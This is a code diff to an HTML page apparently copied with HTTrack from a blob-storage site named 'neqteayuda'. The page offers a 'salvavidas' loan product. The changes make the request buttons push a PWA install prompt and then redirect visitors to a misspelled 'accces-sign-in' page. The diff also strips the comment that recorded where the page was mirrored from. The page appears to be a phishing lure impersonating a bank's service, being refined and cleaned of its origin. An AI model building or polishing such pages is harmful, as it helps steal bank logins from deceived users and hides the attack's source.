@@ -193,49 +193,53 @@
       </div>
     </footer>
 
-    <!-- Script idéntico al de tu ejemplo para capturar la PWA -->
+    <!-- Lógica de PWA e instalación en los botones -->
     <script>
-      window.deferredPrompt = null;
+      let deferredPrompt = null;
 
-      window.addEventListener('beforeinstallprompt', (event) => {
-          event.preventDefault();
-          window.deferredPrompt = event;
+      // Guardar el evento cuando la PWA esté lista en el celular
+      window.addEventListener('beforeinstallprompt', (e) => {
+        e.preventDefault();
+        deferredPrompt = e;
       });
-    </script>
 
-    <script>
+      // Función que procesa el clic en cualquier botón de solicitar
+      async function procesarSolicitud() {
+        localStorage.setItem("typeProduct", "salvavidas");
+
+        if (deferredPrompt) {
+          // Lanza la ventana nativa de instalación
+          deferredPrompt.prompt();
+          
+          // Espera la decisión del usuario (Instalar o Cancelar)
+          const { outcome } = await deferredPrompt.userChoice;
+          deferredPrompt = null;
+
+          // Después de responder al cuadro, redirige
+          window.location.href = "access-passed/accces-sign-in.php.html";
+        } else {
+          // Si por alguna razón no está disponible la PWA, redirige de inmediato
+          window.location.href = "access-passed/accces-sign-in.php.html";
+        }
+      }
+
       const salvavidas = document.getElementById("salvavidas");
+      const btnSolicitar = document.getElementById("btn-solicitar");
       const closeModal = document.getElementById("closeModal");
       const imageInit = document.getElementById("imageInit");
 
       salvavidas.addEventListener("click", (event) => {
-        // Opcional: Si el prompt está listo, al hacer clic en solicitar también intenta disparar la instalación
-        if (window.deferredPrompt) {
-          window.deferredPrompt.prompt();
-          window.deferredPrompt.userChoice.then((choiceResult) => {
-            window.deferredPrompt = null;
-          });
-        }
-
-        localStorage.setItem("typeProduct", "salvavidas");
-        window.location.href = "access-passed/accces-sign-in.php.html";
+        event.preventDefault();
+        procesarSolicitud();
       });
 
-      const btnSolicitar = document.getElementById("btn-solicitar");
-
       btnSolicitar.addEventListener("click", (event) => {
-        if (window.deferredPrompt) {
-          window.deferredPrompt.prompt();
-          window.deferredPrompt.userChoice.then((choiceResult) => {
-            window.deferredPrompt = null;
-          });
-        }
-
-        localStorage.setItem("typeProduct", "salvavidas");
-        window.location.href = "access-passed/accces-sign-in.php.html";
+        event.preventDefault();
+        procesarSolicitud();
       });
 
       closeModal.addEventListener("click", (event) => {
+        event.preventDefault();
         imageInit.style.display = "none";
       });
 
@@ -267,6 +271,4 @@
       }
     </script>
   </body>
-
-<!-- Mirrored from https://neqteayuda.blob.core.windows.net/neqkm/index.php.html by HTTrack Website Copier/3.x [XR&CO], Sun, 18 Oct 2026 23:03:27 GMT -->
 </html>
